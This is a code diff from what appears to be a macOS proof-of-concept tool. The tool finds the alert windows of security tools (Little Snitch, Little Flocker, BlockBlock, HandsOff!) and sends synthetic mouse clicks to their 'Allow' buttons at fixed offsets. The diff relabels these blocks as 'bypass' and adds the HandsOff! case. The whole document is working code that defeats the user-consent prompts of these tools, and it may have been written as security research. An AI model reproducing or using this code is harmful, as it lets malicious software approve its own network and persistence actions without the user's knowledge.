@@ -55,33 +55,41 @@ int main(int argc, const char * argv[]) {
             //NSLog(@"%@", element);
             //continue;
             
-            // Little Flocker detection
-            if([kCGWindowName isEqualToString:@"Little Flocker"] && [kCGWindowLayer intValue] != 0) {
+            // Little Flocker (before 1.3.0) bypass
+            if([kCGWindowOwnerName isEqualToString:@"Little Flocker"] && [kCGWindowLayer intValue] == 2147483631 && [kCGWindowIsOnscreen intValue] == 1) {
 
                 // Window is present, click on the button "Allow"
                 clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 666, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 280), oldLocation);
             }
             
-            // Little Snitch detection
+            // Little Snitch bypass
             if([kCGWindowName isEqualToString:@"Little Snitch"] && [kCGWindowOwnerName isEqualToString:@"Little Snitch Agent"] && [kCGWindowLayer intValue] == 1490 && [kCGWindowIsOnscreen intValue] == 1) {
                 
                 // Window is present, click on the button "Allow"
                 clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 587, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 340), oldLocation);
             }
             
+            // BlockBlock bypass
+            if([kCGWindowOwnerName isEqualToString:@"BlockBlock"] && [kCGWindowLayer intValue] == 3 && [kCGWindowIsOnscreen intValue] == 1) {
+                
+                // Window is present, click on the button "Allow"
+                clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 634, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 319), oldLocation);
+            }
+            
+            // HandsOff! bypass
+            if([kCGWindowName isEqualToString:@"HandsOff"] && [kCGWindowOwnerName isEqualToString:@"HandsOffAgent"] && [kCGWindowIsOnscreen intValue] == 1) {
+                
+                // Window is present, click on the button "Allow"
+                clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 503, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 275), oldLocation);
+                [NSThread sleepForTimeInterval:1];
+            }
+
             // SecurityAgent (not working since macOS do have a mitigation against this attack)
             /*if([kCGWindowOwnerName isEqualToString:@"SecurityAgent"] && [kCGWindowLayer intValue] == 1000 && [kCGWindowIsOnscreen intValue] == 1) {
              
              // Window is present, click on the button "Allow"
              clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 394, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 170), oldLocation);
              }*/
-            
-            // BlockBlock detection
-            if([kCGWindowOwnerName isEqualToString:@"BlockBlock"] && [kCGWindowLayer intValue] == 3 && [kCGWindowIsOnscreen intValue] == 1) {
-                
-                // Window is present, click on the button "Allow"
-                clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 634, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 319), oldLocation);
-            }
         }
     }
 
